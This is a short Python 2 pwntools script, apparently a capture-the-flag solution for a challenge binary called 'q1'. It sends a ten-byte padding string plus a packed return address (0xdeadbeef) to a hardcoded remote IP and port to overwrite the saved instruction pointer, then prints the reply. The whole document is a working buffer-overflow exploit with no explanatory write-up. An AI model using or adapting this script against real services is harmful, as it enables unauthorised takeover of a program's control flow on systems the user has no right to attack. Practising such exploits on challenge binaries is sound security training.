#!/usr/bin/python2
from pwn import *
eip = struct.pack("I", 0xdeadbeef)
#io = process("./q1")
io = remote("68.183.158.95", 8989)
io.sendline("A"*10 + eip)
print io.recvall()